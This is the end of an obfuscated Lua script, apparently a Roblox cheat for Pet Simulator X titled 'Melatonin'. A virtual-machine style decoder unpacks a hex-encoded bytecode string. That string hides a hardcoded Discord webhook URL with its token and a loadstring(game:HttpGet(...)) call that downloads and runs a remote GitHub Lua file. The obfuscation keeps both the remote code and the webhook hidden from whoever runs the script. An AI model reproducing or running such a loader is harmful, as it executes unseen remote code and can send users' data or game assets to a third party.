																									v155 = v35() ~= (1819 - (1187 + 520 + 112));
																								elseif (v154 == (6 - (10 - 6))) then
																									v155 = v38();
																								elseif (v154 == (208 - ((52 - 15) + 88 + 80))) then
																									v155 = v39();
																								end
																								v76[v151] = v155;
																								break;
																							end
																							if (v153 == 0) then
																								local v176 = 0;
																								while true do
																									if (v176 == 0) then
																										v154 = v35();
																										v155 = nil;
																										v176 = 1;
																									end
																									if (1 == v176) then
																										v153 = 1;
																										break;
																									end
																								end
																							end
																						end
																						break;
																					end
																				end
																			end
																			v74[3] = v35();
																			v125 = 1;
																		end
																		if (v125 == 1) then
																			for v156 = 1637 - (712 + 924), v37() do
																				local v157 = 0;
																				local v158;
																				local v159;
																				while true do
																					if (v157 == 1) then
																						while true do
																							if (v158 == 0) then
																								v159 = v35();
																								if (v34(v159, 1 + 0 + 0, 1 + 0) == (1374 - (1178 + 196))) then
																									local v180 = 0;
																									local v181;
																									local v182;
																									local v183;
																									local v184;
																									while true do
																										if (v180 == 0) then
																											v181 = 0;
																											v182 = nil;
																											v180 = 1;
																										end
																										if (v180 == 2) then
																											while true do
																												if (v181 == 3) then
																													if (v34(v183, 1 + 0 + 2 + 0, 2 + 1) == 1) then
																														v184[1667 - ((2451 - 1631) + 843)] = v76[v184[7 - 3]];
																													end
																													v71[v156] = v184;
																													break;
																												end
																												if (v181 == 1) then
																													local v200 = 0;
																													while true do
																														if (v200 == 1) then
																															v181 = 2;
																															break;
																														end
																														if (0 == v200) then
																															v184 = {v36(),v36(),nil,nil};
																															if (v182 == (0 - (1645 - (1496 + 149)))) then
																																local v209 = 0;
																																local v210;
																																while true do
																																	if (v209 == 0) then
																																		v210 = 0;
																																		while true do
																																			if (0 == v210) then
																																				v184[3 + 0] = v36();
																																				v184[10 - 6] = v36();
																																				break;
																																			end
																																		end
																																		break;
																																	end
																																end
																															elseif (v182 == (1 + 0)) then
																																v184[1902 - (176 + 1723)] = v37();
																															elseif (v182 == (1 + 1)) then
																																v184[294 - (21 + (618 - 348))] = v37() - (2 ^ 16);
																															elseif (v182 == (2 + 1)) then
																																local v222 = 0;
																																local v223;
																																while true do
																																	if (v222 == 0) then
																																		v223 = 0;
																																		while true do
																																			if (v223 == 0) then
																																				v184[1 + 2] = v37() - ((5 - 3) ^ (20 - (1861 - (1296 + 561))));
																																				v184[6 - 2] = v36();
																																				break;
																																			end
																																		end
																																		break;
																																	end
																																end
																															end
																															v200 = 1;
																														end
																													end
																												end
																												if (v181 == 2) then
																													local v201 = 0;
																													while true do
																														if (v201 == 0) then
																															if (v34(v183, 1 + 0, (1 - 0) + 0 + 0) == 1) then
																																v184[(93 + 71) - (12 + 136 + 14)] = v76[v184[2]];
																															end
																															if (v34(v183, 621 - (15 + 604), 1 + 1) == (1 + (1333 - (569 + 764)))) then
																																v184[3] = v76[v184[3]];
																															end
																															v201 = 1;
																														end
																														if (v201 == 1) then
																															v181 = 3;
																															break;
																														end
																													end
																												end
																												if (0 == v181) then
																													local v202 = 0;
																													while true do
																														if (v202 == 0) then
																															v182 = v34(v159, (80 - (33 + 45)) + (128 - (119 + 9)), (8 - 4) - (1122 - (948 + 173)));
																															v183 = v34(v159, 3 + 1, 6);
																															v202 = 1;
																														end
																														if (1 == v202) then
																															v181 = 1;
																															break;
																														end
																													end
																												end
																											end
																											break;
																										end
																										if (1 == v180) then
																											v183 = nil;
																											v184 = nil;
																											v180 = 2;
																										end
																									end
																								end
																								break;
																							end
																						end
																						break;
																					end
																					if (v157 == 0) then
																						v158 = 0;
																						v159 = nil;
																						v157 = 1;
																					end
																				end
																			end
																			v70 = 3;
																			break;
																		end
																	end
																end
																v113 = 1;
															end
															if (v113 == 1) then
																if (v70 == 1) then
																	local v126 = 0;
																	while true do
																		if (1 == v126) then
																			v76 = {};
																			v70 = 2;
																			break;
																		end
																		if (v126 == 0) then
																			v74 = {v71,v72,nil,v73};
																			v75 = v37();
																			v126 = 1;
																		end
																	end
																end
																if (3 == v70) then
																	local v127 = 0;
																	while true do
																		if (v127 == 0) then
																			for v160 = 1 + 0, v37() do
																				v72[v160 - ((82 + 837) - ((1243 - (333 + 470)) + 478))] = v42();
																			end
																			for v162 = 1 + 0, v37() do
																				v73[v162] = v37();
																			end
																			v127 = 1;
																		end
																		if (1 == v127) then
																			return v74;
																		end
																	end
																end
																break;
															end
														end
													end
													break;
												end
												if (v69 == 0) then
													v70 = 0;
													v71 = nil;
													v69 = 1;
												end
											end
										end
										v49 = 1;
									end
									if (1 == v49) then
										v43 = nil;
										v31 = 7;
										break;
									end
								end
							end
							v45 = 3;
						end
						if (v45 == 1) then
							if (v31 == 2) then
								local v50 = 0;
								while true do
									if (v50 == 0) then
										function v35()
											local v77 = 0;
											local v78;
											local v79;
											while true do
												if (v77 == 1) then
													while true do
														local v114 = 0;
														while true do
															if (v114 == 0) then
																if (v78 == 1) then
																	return v79;
																end
																if (0 == v78) then
																	local v128 = 0;
																	while true do
																		if (v128 == 1) then
																			v78 = 1657 - (255 + 1401);
																			break;
																		end
																		if (0 == v128) then
																			v79 = v9(v28, v32, v32);
																			v32 = v32 + ((1 + 3) - 3);
																			v128 = 1;
																		end
																	end
																end
																break;
															end
														end
													end
													break;
												end
												if (v77 == 0) then
													v78 = 0;
													v79 = nil;
													v77 = 1;
												end
											end
										end
										v36 = nil;
										v50 = 1;
									end
									if (v50 == 1) then
										function v36()
											local v80 = 0;
											local v81;
											local v82;
											local v83;
											while true do
												if (v80 == 1) then
													v83 = nil;
													while true do
														local v115 = 0;
														while true do
															if (v115 == 0) then
																if (v81 == 1) then
																	return (v83 * (159 + 97)) + v82;
																end
																if (v81 == 0) then
																	local v129 = 0;
																	while true do
																		if (v129 == 0) then
																			v82, v83 = v9(v28, v32, v32 + ((75 + 115) - (((181 + 258) - ((1448 - (400 + 766)) + 84)) + (2020 - (902 + 1062)) + 59)));
																			v32 = v32 + ((3076 - ((326 - 104) + 1772)) - (1 + 106 + (956 - (430 + 108)) + 555));
																			v129 = 1;
																		end
																		if (v129 == 1) then
																			v81 = 410 - (51 + 358);
																			break;
																		end
																	end
																end
																break;
															end
														end
													end
													break;
												end
												if (v80 == 0) then
													v81 = 0;
													v82 = nil;
													v80 = 1;
												end
											end
										end
										v31 = 3;
										break;
									end
								end
							end
							if (v31 == 1) then
								local v51 = 0;
								while true do
									if (v51 == 1) then
										v35 = nil;
										v31 = 2;
										break;
									end
									if (0 == v51) then
										v34 = nil;
										function v34(v84, v85, v86)
											if v86 then
												local v105 = 0;
												local v106;
												local v107;
												while true do
													if (v105 == 1) then
														while true do
															if ((0 + 0) == v106) then
																local v119 = 0;
																while true do
																	if (v119 == 0) then
																		v107 = (v84 / ((1 + ((1939 - 558) - ((1836 - (1203 + 541)) + (3653 - 2365)))) ^ (v85 - ((3 - 2) - (0 - 0))))) % (2 ^ (((v86 - 1) - (v85 - ((9 - 7) - (1992 - (1827 + 164))))) + (57 - (40 + 16))));
																		return v107 - (v107 % (1488 - ((1943 - 1343) + 887)));
																	end
																end
															end
														end
														break;
													end
													if (v105 == 0) then
														v106 = 0;
														v107 = nil;
														v105 = 1;
													end
												end
											else
												local v108 = 0;
												local v109;
												local v110;
												while true do
													if (v108 == 0) then
														v109 = 0;
														v110 = nil;
														v108 = 1;
													end
													if (v108 == 1) then
														while true do
															if (v109 == 0) then
																local v120 = 0;
																while true do
																	if (v120 == 0) then
																		v110 = (1 + 1 + 0) ^ (v85 - ((2350 - ((143 - 87) + 613)) - ((2043 - (377 + 357)) + 371)));
																		return (((v84 % (v110 + v110)) >= v110) and 1) or (0 + 0 + ((0 + 0) - 0));
																	end
																end
															end
														end
														break;
													end
												end
											end
										end
										v51 = 1;
									end
								end
							end
							v45 = 2;
						end
						if (v45 == 3) then
							if (v31 == 5) then
								local v52 = 0;
								while true do
									if (v52 == 0) then
										v40 = v37;
										v41 = nil;
										v52 = 1;
									end
									if (v52 == 1) then
										function v41(...)
											return {...}, v20("#", ...);
										end
										v31 = 6;
										break;
									end
								end
							end
							if (v31 == 4) then
								local v53 = 0;
								while true do
									if (v53 == 1) then
										function v39(v87)
											local v88 = 0;
											local v89;
											local v90;
											local v91;
											while true do
												if (0 == v88) then
													v89 = 0;
													v90 = nil;
													v88 = 1;
												end
												if (v88 == 1) then
													v91 = nil;
													while true do
														local v116 = 0;
														while true do
															if (v116 == 1) then
																if (v89 == 2) then
																	local v130 = 0;
																	while true do
																		if (v130 == 1) then
																			v89 = 3;
																			break;
																		end
																		if (0 == v130) then
																			v91 = {};
																			for v164 = 1, #v90 do
																				v91[v164] = v10(v9(v11(v90, v164, v164)));
																			end
																			v130 = 1;
																		end
																	end
																end
																if (v89 == (1 + 0)) then
																	local v131 = 0;
																	while true do
																		if (v131 == 1) then
																			v89 = 2;
																			break;
																		end
																		if (0 == v131) then
																			v90 = v11(v28, v32, (v32 + v87) - (1 + 0));
																			v32 = v32 + v87;
																			v131 = 1;
																		end
																	end
																end
																break;
															end
															if (v116 == 0) then
																if (v89 == (1 + 2)) then
																	return v14(v91);
																end
																if ((0 - 0) == v89) then
																	local v132 = 0;
																	while true do
																		if (v132 == 0) then
																			v90 = nil;
																			if not v87 then
																				local v167 = 0;
																				local v168;
																				while true do
																					if (0 == v167) then
																						v168 = 1349 - (488 + 861);
																						while true do
																							if (v168 == 0) then
																								v87 = v37();
																								if (v87 == ((2746 - 1328) - (553 + (1982 - 1117)))) then
																									return "";
																								end
																								break;
																							end
																						end
																						break;
																					end
																				end
																			end
																			v132 = 1;
																		end
																		if (v132 == 1) then
																			v89 = 1;
																			break;
																		end
																	end
																end
																v116 = 1;
															end
														end
													end
													break;
												end
											end
										end
										v31 = 5;
										break;
									end
									if (v53 == 0) then
										function v38()
											local v92 = 0;
											local v93;
											local v94;
											local v95;
											local v96;
											local v97;
											local v98;
											local v99;
											while true do
												if (v92 == 0) then
													v93 = 0;
													v94 = nil;
													v92 = 1;
												end
												if (3 == v92) then
													v99 = nil;
													while true do
														local v117 = 0;
														while true do
															if (v117 == 0) then
																if (v93 == (1 + 0)) then
																	local v133 = 0;
																	while true do
																		if (v133 == 0) then
																			v96 = 1;
																			v97 = (v34(v95, (740 - (86 + 653)) + 0 + (1396 - (146 + 1250)), 2007 - (1454 + (867 - 334))) * ((((159 - 127) - 23) - (19 - 12)) ^ (115 - 83))) + v94;
																			v133 = 1;
																		end
																		if (v133 == 1) then
																			v93 = 4 - 2;
																			break;
																		end
																	end
																end
																if ((0 - 0) == v93) then
																	local v134 = 0;
																	while true do
																		if (v134 == 0) then
																			v94 = v37();
																			v95 = v37();
																			v134 = 1;
																		end
																		if (1 == v134) then
																			v93 = 1;
																			break;
																		end
																	end
																end
																v117 = 1;
															end
															if (1 == v117) then
																if (v93 == 3) then
																	local v135 = 0;
																	while true do
																		if (v135 == 0) then
																			if (v98 == (0 - 0)) then
																				if (v97 == (0 + 0)) then
																					return v99 * ((2409 - (554 + 51)) - (1412 + (1101 - 709)));
																				else
																					local v169 = 0;
																					local v170;
																					while true do
																						if (v169 == 0) then
																							v170 = 0;
																							while true do
																								if (v170 == (0 - 0)) then
																									v98 = (4 - 1) - (9 - 7);
																									v96 = 0;
																									break;
																								end
																							end
																							break;
																						end
																					end
																				end
																			elseif (v98 == ((4537 - (863 + 165)) - 1462)) then
																				return ((v97 == (((0 + 0) - 0) - ((1840 - (1459 + 381)) - 0))) and (v99 * ((46 - (32 + 13)) / ((1983 - (1115 + 868)) + 0)))) or (v99 * NaN);
																			end
																			return v16(v99, v98 - (230 + 707 + (536 - (388 + (1047 - (687 + 298)))))) * (v96 + (v97 / (((2 + 0) - (0 - 0)) ^ ((211 + 36) - (847 - 652)))));
																		end
																	end
																end
																if (v93 == (1568 - (1105 + 461))) then
																	local v136 = 0;
																	while true do
																		if (v136 == 1) then
																			v93 = 3;
																			break;
																		end
																		if (v136 == 0) then
																			v98 = v34(v95, (1630 - (945 + 36)) - (400 + 228), (47 - 33) + (1243 - (292 + 934)));
																			v99 = ((v34(v95, (3650 - 2081) - (((2445 - 822) - (1122 - 742)) + (1795 - (1108 + 393)))) == (1 + 0)) and -(1 + 0)) or ((1712 - (74 + 1637)) + 0);
																			v136 = 1;
																		end
																	end
																end
																break;
															end
														end
													end
													break;
												end
												if (v92 == 2) then
													v97 = nil;
													v98 = nil;
													v92 = 3;
												end
												if (v92 == 1) then
													v95 = nil;
													v96 = nil;
													v92 = 2;
												end
											end
										end
										v39 = nil;
										v53 = 1;
									end
								end
							end
							break;
						end
					end
				end
				break;
			end
		end
	end
	v23("LOL!473O0003063O00737472696E6703043O006368617203043O00627974652O033O0073756203053O0062697433322O033O0062697403043O0062786F7203053O007461626C6503063O00636F6E63617403063O00696E7365727403043O0053B686DE03083O0030DEE7AC5486E2C003043O00C241581803083O00A0382C7D695796A62O033O002D932803053O005EE64A57DC03043O0023DB2EE103073O0041A3419369B4CE03063O00BECA421CC81403073O00DDA52C7FA9605903063O0013EA98C6D0E403063O007A84EBA3A29003023O005F4703083O0031AFC4050ABDCC1203043O0064DCA17703083O009420AA593AA1EF7E03063O00DF4FC73649C0030A3O00E5BA3B88C6AD0780DBBC03043O00B6D949E103283O004D656C61746F6E696E207C205B2O3F4D494E455D205065742053696D756C61746F72205821202O3F03073O00F2093C1DD1348303083O00A56C5E75BE5BE81F03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F313039373330383135313337333633393638302F7470786D4F364F77377A3544704A4B4F344C3734372O7543505465587A7147467364686B7769455F623643585F6A34577551684E5575482O62717847353773674A38615F030B3O0097F45290310FB9A3FC538103073O00D09D34E47C6ACA03073O00C24838B800569303073O00962653CB206CD703083O00102A3D2053E1482703073O0054435C4D3C8F2C024O0080841E41030A3O001273DDF974561778C5E503063O00471DB196173D2O0103093O00803F13C7045FFEB73403073O00C15167AE483A9F03053O00C62B35333203073O00855954405A1BB503043O00DD571CA803063O00893E6C996E50030D3O00446F6E2774206C65617665202103043O00374B092203043O0063227910031D3O00D42B0B09A33F0C09EA264209EB2F4211EC2B0614ED2D421BEA240B0EEB03043O00834A627D03043O0013B0D88303073O0047D9A8B0ED8AAC03183O00B128900D6C9B2497163C9C678C0C6C8428841B258620CB5103053O00E847E57F4C03043O0018202F9A03063O004C495FAE706803223O007D514C487BBC095255483AB60945495932B109444F487BAE4A424E5D2FFD455F464903063O002930272D5BDD03043O0043BE162303043O0017D7661603213O00446F6E277420666F7267657420746F206A6F696E2074686520646973636F72642103043O0057616974027O0040030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034B3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4B316E736372697074732F41726B68616C69732F6D61696E2F2O375F4F45542O5A47304E532E6C756100B23O0012143O00013O00200A5O0002001214000100013O00200A000100010003001214000200013O00200A000200020004001214000300053O0006050003000A0001000100041C3O000A0001001214000300063O00200A000400030007001214000500083O00200A000500050009001214000600083O00200A00060006000A00060C00073O000100062O00133O00064O00138O00133O00044O00133O00014O00133O00024O00133O00053O001214000800014O0013000900073O00121B000A000B3O00121B000B000C4O00160009000B00022O0020000800080009001214000900014O0013000A00073O00121B000B000D3O00121B000C000E4O0016000A000C00022O002000090009000A001214000A00014O0013000B00073O00121B000C000F3O00121B000D00104O0016000B000D00022O0020000A000A000B001214000B00053O000605000B002C0001000100041C3O002C0001001214000B00064O0013000C00073O00121B000D00113O00121B000E00124O0016000C000E00022O0020000C000B000C001214000D00084O0013000E00073O00121B000F00133O00121B001000144O0016000E001000022O0020000D000D000E001214000E00084O0013000F00073O00121B001000153O00121B001100164O0016000F001100022O0020000E000E000F00060C000F0001000100062O00133O000E4O00133O00084O00133O000C4O00133O00094O00133O000A4O00133O000D4O001100105O001214001100174O0013001200073O00121B001300183O00121B001400194O00160012001400022O00130013000F3O00121B0014001A3O00121B0015001B4O00160013001500022O001E001100120013001214001100174O0013001200073O00121B0013001C3O00121B0014001D4O001600120014000200201000110012001E001214001100174O0013001200073O00121B0013001F3O00121B001400204O0016001200140002002010001100120021001214001100174O0013001200073O00121B001300223O00121B001400234O00160012001400022O00130013000F3O00121B001400243O00121B001500254O00160013001500022O001E001100120013001214001100174O0013001200073O00121B001300263O00121B001400274O0016001200140002002010001100120028001214001100174O0013001200073O00121B001300293O00121B0014002A4O001600120014000200201000110012002B001214001100174O0013001200073O00121B0013002C3O00121B0014002D4O001600120014000200201000110012002B001214001100174O0013001200073O00121B0013002E3O00121B0014002F4O001600120014000200201000110012002B001214001100174O0013001200073O00121B001300303O00121B001400314O0016001200140002002010001100120032001214001100174O0013001200073O00121B001300333O00121B001400344O00160012001400022O00130013000F3O00121B001400353O00121B001500364O00160013001500022O001E001100120013001214001100174O0013001200073O00121B001300373O00121B001400384O00160012001400022O00130013000F3O00121B001400393O00121B0015003A4O00160013001500022O001E001100120013001214001100174O0013001200073O00121B0013003B3O00121B0014003C4O00160012001400022O00130013000F3O00121B0014003D3O00121B0015003E4O00160013001500022O001E001100120013001214001100174O0013001200073O00121B0013003F3O00121B001400404O0016001200140002002010001100120041001214001100423O00121B001200434O0019001100020001001214001100443O001214001200453O00200400120012004600121B001400474O000F001200144O001F00113O00022O00120011000100012O00173O00013O00023O00023O00026O00F03F026O00704002284O001100025O00121B000300014O002100045O00121B000500013O0004150003002300012O000300076O0013000800024O0003000900014O0003000A00024O0003000B00034O0003000C00044O0013000D6O0013000E00063O00202O000F000600012O000F000C000F4O001F000B3O00022O0003000C00034O0003000D00044O0013000E00013O002009000F000600012O0021001000014O0007000F000F0010001008000F0001000F0020090010000600012O0021001100014O000700100010001100100800100001001000202O0010001000012O000F000D00104O000B000C6O001F000A3O000200201A000A000A00022O00180009000A4O000D00073O000100040E0003000500012O0003000300054O0013000400024O0006000300044O000100036O00173O00017O00283O00093O000A3O000A3O000A3O000A3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000A3O000D3O000D3O000D3O000D3O000E3O00033O00028O00026O00F03F026O00704002473O00121B000200014O0002000300043O00261D000200070001000100041C3O0007000100121B000300014O0002000400043O00121B000200023O00261D000200020001000200041C3O0002000100121B000500013O00261D0005000A0001000100041C3O000A000100261D0003003B0001000100041C3O003B000100121B000600013O00261D000600360001000100041C3O003600012O001100076O0013000400073O00121B000700024O002100085O00121B000900023O0004150007003500012O0003000B6O0013000C00044O0003000D00014O0003000E00024O0003000F00034O0003001000044O001300116O00130012000A3O00202O0013000A00022O000F001000134O001F000F3O00022O0003001000034O0003001100044O0013001200013O0020090013000A00022O0021001400014O00070013001300140010080013000200130020090014000A00022O0021001500014O000700140014001500100800140002001400202O0014001400022O000F001100144O000B00106O001F000E3O000200201A000E000E00032O0018000D000E4O000D000B3O000100040E00070017000100121B000600023O00261D0006000F0001000200041C3O000F000100121B000300023O00041C3O003B000100041C3O000F000100261D000300090001000200041C3O000900012O0003000600054O0013000700044O0006000600074O000100065O00041C3O0009000100041C3O000A000100041C3O0009000100041C3O0046000100041C3O000200012O00173O00017O00473O00173O00183O001B3O001B3O001C3O001D3O001E3O00203O00203O00223O00243O00243O00253O00253O00263O00283O00283O00293O00293O002A3O002A3O002A3O002A3O002B3O002B3O002B3O002B3O002B3O002B3O002B3O002B3O002B3O002B3O002B3O002B3O002B3O002B3O002B3O002B3O002B3O002B3O002B3O002B3O002B3O002B3O002B3O002B3O002B3O002B3O002B3O002B3O002B3O002A3O002D3O002F3O002F3O00303O00313O00323O00353O00353O00363O00363O00363O00363O00383O00393O003A3O003C3O003D3O003F3O00B23O00013O00013O00023O00023O00033O00033O00043O00043O00043O00043O00053O00063O00063O00073O00073O000E3O000E3O000E3O000E3O000E3O000E3O000E3O000F3O000F3O000F3O000F3O000F3O000F3O00103O00103O00103O00103O00103O00103O00113O00113O00113O00113O00113O00113O00123O00123O00123O00123O00133O00133O00133O00133O00133O00143O00143O00143O00143O00143O00143O00153O00153O00153O00153O00153O00153O003F3O003F3O003F3O003F3O003F3O003F3O003F3O00403O00413O00413O00413O00413O00413O00413O00413O00413O00413O00413O00423O00423O00423O00423O00423O00423O00433O00433O00433O00433O00433O00433O00443O00443O00443O00443O00443O00443O00443O00443O00443O00443O00453O00453O00453O00453O00453O00453O00463O00463O00463O00463O00463O00463O00473O00473O00473O00473O00473O00473O00483O00483O00483O00483O00483O00483O00493O00493O00493O00493O00493O00493O004A3O004A3O004A3O004A3O004A3O004A3O004A3O004A3O004A3O004A3O004B3O004B3O004B3O004B3O004B3O004B3O004B3O004B3O004B3O004B3O004C3O004C3O004C3O004C3O004C3O004C3O004C3O004C3O004C3O004C3O004D3O004D3O004D3O004D3O004D3O004D3O004E3O004E3O004E3O004F3O004F3O004F3O004F3O004F3O004F3O004F3O004F3O00", v17(), ...);
end
